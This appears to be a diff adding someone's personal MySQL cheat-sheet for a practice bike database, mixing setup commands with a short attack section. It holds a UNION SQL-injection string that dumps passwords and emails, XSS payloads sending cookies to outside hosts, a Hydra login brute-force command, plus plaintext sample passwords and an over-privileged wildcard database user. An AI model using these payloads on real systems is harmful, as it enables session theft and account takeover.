@@ -1,0 +1,96 @@
+# online datenbank
+# lima-city.de
+
+# go into sql shell
+sudo mysql -u root -p
+
+# database aufmachen
+create database bikedb;
+
+# show database;
+show databases;
+
+# verwende database
+use bikedb;
+
+# create table mit namen bikefeatures
+create table bikefeatures (id INT NOT NULL auto_increment, primary key (id));
+alter table bikefeatures add column bikename VARCHAR(64) not null;
+alter table bikefeatures add column size VARCHAR(30) not null;
+alter table bikefeatures add column user VARCHAR(64) not null;
+alter table bikefeatures add column description VARCHAR(128) not null;
+
+# create table mit namen bikeusers
+create table bikeusers(id int not null auto_increment, primary key(id));
+alter table bikeusers add column username varchar(30) not null;
+alter table bikeusers add column email_address varchar(50) not null;
+alter table bikeusers add column password varchar(60) not null;
+
+
+# make entries unique, see bikeusers above
+ALTER TABLE bikeusers ADD UNIQUE (username);
+ALTER TABLE bikeusers ADD UNIQUE (email_address);
+
+
+
+
+# show tables of current database
+show tables;
+
+# drop tables bikeusers
+drop tables bikeusers;
+
+# get details of table
+describe bikefeatures;
+
+#insert into bikefeatures table
+INSERT INTO bikefeatures (id, bikename, size, user, description) VALUES (1, 'Orbea Rise', 'Large', 'martin', 'Light E-Mountainbike');
+INSERT INTO bikefeatures (id, bikename, size, user, description) VALUES (2, 'Cube Stereo Hybrid', 'Small', 'Lisa', 'Full E-Mountainbike');
+INSERT INTO bikefeatures (id, bikename, size, user, description) VALUES (3, 'Propain Frechdax', 'uni', 'Lotta', 'Fully for kids');
+
+#insert into bikeusers table
+INSERT INTO bikeusers (id, username, email_address, password) VALUES (1, 'martin', 'martin@goien.de', 'pass');
+INSERT INTO bikeusers (id, username, email_address, password) VALUES (2, 'Lisa', 'Lisa@goien.de', 'pass');
+INSERT INTO bikeusers (id, username, email_address, password) VALUES (3, 'Lotta', 'Lotta@goien.de', 'pass');
+
+#check content of table
+select * from bikefeatures;
+select * from bikeusers;
+
+# set password policy
+SET GLOBAL validate_password_policy=LOW;
+# create users
+CREATE USER 'bikeuser'@'%' IDENTIFIED WITH mysql_native_password BY 'example123';
+# grant full privileges
+GRANT CREATE, ALTER, DROP, INSERT, UPDATE, DELETE, SELECT, REFERENCES, RELOAD on *.* TO 'bikeuser'@'%' WITH GRANT OPTION;
+# grant partial privileges
+GRANT INSERT, SELECT, DELETE, DROP, UPDATE on bikedb.* TO 'bikeuser'@'%';
+
+#filter item from table content
+select * from bikefeatures where user='martin';
+
+#show grants
+show grants for 'bikeuser'@'%';
+
+#remove grants
+revoke all on *.* from 'bikeuser'@'%';
+
+#löschen der Zeile 9 aus bikefeatures
+DELETE FROM bikefeatures WHERE id = 9;
+
+#löschen der Zeile 9 bis 11 aus bikefeatures
+DELETE FROM bikefeatures WHERE id IN (9, 10, 11);
+
+#sql injection
+' OR '1'='1' UNION SELECT password FROM bikeusers UNION SELECT email_address FROM bikeusers UNION SELECT user() UNION SELECT database() UNION SELECT table_name FROM information_schema.tables  WHERE table_schema =database() #
+' OR 1=1#
+
+#XSS
+<script>window.location.href="https://en0t0nwzu0td7b.x.pipedream.net/"+document.cookie</script>
+<script>var cookieValue = document.cookie; var img = new Image(); img.src = 'http://srhdthner5ht.de' + encodeURIComponent(cookieValue);</script>
+<script>var img=new Image(); img.src="http://127.0.0.1:5001/?cookie="+(document.cookie);</script>
+
+ALTER TABLE bikefeatures MODIFY COLUMN bikename VARCHAR(128);
+
+Hydra:
+hydra -l martin -P /mnt/c/Users/Martin/Nextcloud4/Gymondo/HackBF/pythonProject/testliste.txt -s 5000 192.168.72.242 http-post-form "/login:Username=^USER^&Password=^PASS^:S=HTTP/1.1 302"
